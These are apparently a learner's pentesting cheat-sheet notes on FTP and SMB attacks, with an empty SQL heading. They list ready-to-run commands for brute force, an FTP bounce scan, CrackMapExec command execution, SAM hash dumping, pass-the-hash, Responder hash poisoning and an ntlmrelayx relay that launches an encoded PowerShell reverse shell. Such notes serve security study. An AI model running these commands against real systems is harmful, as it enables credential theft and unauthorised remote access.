Navigation: [[Pentesting]]

---
# Protocols
1. FTP
2. SMB
3. SQL
4. RDP
5. DNS
6. SMTP
# FTP
### Enumeration
**Local Config**
```shell
cat /etc/vsftpd.conf | grep -v "#"

cat /etc/ftpusers
```
**Remote Enumeration**
```shell
nmap --script ftp-* -p 21 <ip>
```
### Brute Force
**Hydra**
```shell
hydra -l <user> -P <password_list> ftp://<host>
```
**Medusa**
```shell
medusa -u <user> -P <password_list> -h <host> -M ftp 
```
### Bounce Attack
In an FTP bounce attack, we're using a proxy FTP server to perform our attacks. This proxy is usually located in a DMZ. Here's a diagram from G4G:
![[ftp_bounce_attack.webp]]

**FTP Bounce using Nmap:**
```shell
nmap -Pn -v -n -p80 -b <user>:<pass>@<external_host> <internal_host>
```

Here's some further [reading](http://www.ouah.org/ftpbounce.html).
# SMB
### Enumeration
**Nmap Scan**
```shell
sudo nmap <Host> -sV -sC -p139,445
```

**Finding server shares:**
```shell
smbclient -N -L //<host>

smbmap -H <host> # Add -r <directory> to view directory
```

**Downloading and Uploading (If Allowed):**
```shell
smbmap -H <host> --download "notes\note.txt"

smbmap -H <host> --upload test.txt "notes\test.txt"
```

**RPC Client:**
Use the [SANS Cheatsheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to find commands to use after.
```shell
rpcclient -U'%' <host>

rpcclient -U "username%passwd" <IP> #With creds
```

**Enum4Linux**
[Source](https://github.com/cddmp/enum4linux-ng)
```shell-session
./enum4linux-ng.py <host> -A -C
```
### Brute Force
```shell
nmap --script smb-brute -p 445 <IP>

hydra -l Administrator -P words.txt <host> smb -t 1
```

### CrackMapExec
**Brute Force Users**
```shell
crackmapexec smb <host> -u /tmp/userlist.txt -p <'password'>
```

**Execute Command**
```shell
crackmapexec smb 10.10.110.17 -u <user> -p <'password'> -x <'cmd'> --exec-method smbexec
```

**Enumerate Logged on Users**
```shell
crackmapexec smb <IP>/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract SAM Hashes**
```shell
crackmapexec smb <host> -u administrator -p 'Password123!' --sam
```

**Pass-The-Hash**
```shell
crackmapexec smb <host> -u Administrator -H <hash>
```
### Responder
Tool used to poison `LLMNR`, `NBT-NS`, and `MDNS`. It can also set up fake services to steal `NetNTLM v1/v2` hashes.

**Setting up a Fake Server**
```shell
responder -I <interface name>
```
### Impacket
**Connect to Host**
Same options for `impacket-smbexec` and `impacket-atexec`
```shell
impacket-psexec <user>:<'password'> <host>
```

The next few commands are for use with `Responder`. Ensure the following:
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

**Extract SAM Hashes**
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host>
```

**Execute Reverse Shell**
[Create shell here](https://www.revshells.com/)
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <host> -c 'powershell -e <base64 reverse shell>' # -c option allows us to use commands
```
# SQL


---
Navigation: [[Pentesting]]